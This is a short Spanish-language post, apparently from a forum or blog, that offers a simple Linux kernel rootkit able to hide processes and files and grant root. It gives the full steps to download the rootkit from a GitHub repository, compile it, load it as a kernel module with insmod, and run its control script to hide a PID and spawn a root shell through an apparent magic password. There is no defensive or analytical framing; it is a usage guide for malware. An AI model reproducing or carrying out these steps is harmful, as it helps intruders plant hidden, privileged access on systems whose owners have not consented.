Rootkit simple para linux

Este rootkit puede ocultar procesos, archivos y elevar privilegios de root.

//Descarga:

$git clone https://github.com/ivyl/rootkit.git

//Compilado:

$ sudo apt-get install linux-headers-$(uname -r)
$ cd rootkit
# make

//InstalaciÃ³n:

# insmod rt.ko

//Uso:

# tools/rtcmd.py hpXXXX    // XXXX -> PID
# tools/rtcmd.py mypenislong /bin/bash
